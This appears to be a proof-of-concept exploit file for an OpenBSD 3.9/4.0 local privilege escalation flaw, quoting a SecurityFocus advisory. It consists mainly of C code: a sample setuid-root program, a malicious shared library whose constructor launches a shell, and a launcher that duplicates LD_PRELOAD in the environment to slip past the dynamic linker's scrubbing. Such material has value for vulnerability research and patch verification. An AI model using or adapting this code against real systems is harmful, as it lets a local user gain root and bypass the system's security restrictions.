/*
source: http://www.securityfocus.com/bid/21188/info

OpenBSD is prone to a local vulnerability that may allow attackers to pass malicious environment variables to applications, bypassing expected security restrictions.

Attackers may be able to exploit this issue to execute arbitrary code with elevated privileges. 

This issue affects OpenBSD 3.9 and 4.0; prior versions may also be affected.
*/

// Example Code
// -------------
// vulnerable root-suid program example:

main()
{
 setuid(0);
 execl("/usr/bin/id","id",0);
}



// evil shared library:

__attribute__ ((constructor)) main()
{
  printf("[+] Hello from shared library land\n");
  execle("/bin/sh","sh",0,0);
}



// openbsd _dl_unsetenv bypass:

#define LIB "LD_PRELOAD=/tmp/lib.so"
main(int argc, char *argv[])
{
  char *e[] = { LIB, LIB, 0 };
  int i; for(i = 0; argv[i]; argv[i] = argv[++i]); /* inspired by
 _dl_unsetenv (: */
  execve(argv[0], argv, e);
}